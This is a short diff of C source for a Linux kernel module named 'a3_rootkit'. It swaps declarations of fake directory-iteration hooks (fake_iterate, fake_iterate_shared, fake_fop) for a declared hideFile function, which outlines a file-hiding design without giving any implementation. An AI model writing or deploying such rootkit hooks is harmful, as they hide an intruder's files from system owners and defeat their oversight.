@@ -24,8 +24,7 @@ static ssize_t a3_rootkit_read(struct file *, char __user *, size_t, loff_t *);
 static ssize_t a3_rootkit_write(struct file *, const char __user *, size_t, loff_t *);
 static int a3_rootkit_release(struct inode *, struct file *);
 static long a3_rootkit_ioctl(struct file *, unsigned int, unsigned long);
-static int fake_iterate_shared (struct file *, struct dir_context *);
-static int fake_iterate (struct file *, struct dir_context *);
+static void hideFile(const char * filename);
 
 static struct file_operations a3_rootkit_fo = 
 {
@@ -35,10 +34,4 @@ static struct file_operations a3_rootkit_fo =
     .read = a3_rootkit_read,
     .write = a3_rootkit_write,
     .release = a3_rootkit_release,
-};
-
-static struct file_operations fake_fop = 
-{
-    .iterate_shared = fake_iterate_shared,
-    .iterate = fake_iterate,
 };
